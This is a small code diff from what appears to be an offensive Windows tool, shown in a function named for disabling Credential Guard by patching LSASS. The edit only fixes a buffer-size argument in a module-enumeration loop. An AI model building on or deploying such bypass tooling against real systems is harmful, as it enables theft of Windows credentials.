@@ -54,7 +54,7 @@ DWORD WINAPI disableCredGuardByPatchingLSASS(void) {
     BOOL returnStatus = FALSE;
     TCHAR szModulename[MAX_PATH];
     for (DWORD i = 0; i < (lpcbNeeded / sizeof(HMODULE)); i++) {
-        if (hModulesArray[i] && !GetModuleFileNameEx(hLsass, hModulesArray[i], szModulename, MAX_PATH)) {
+        if (hModulesArray[i] && !GetModuleFileNameEx(hLsass, hModulesArray[i], szModulename, _countof(szModulename))) {
             _tprintf(TEXT("[!] Cred Guard bypass non fatal error: couldn't get module name for module at index 0x%lx (GetModuleFileNameEx, error code 0x%lx)\n"), i, GetLastError());
             continue;
         }
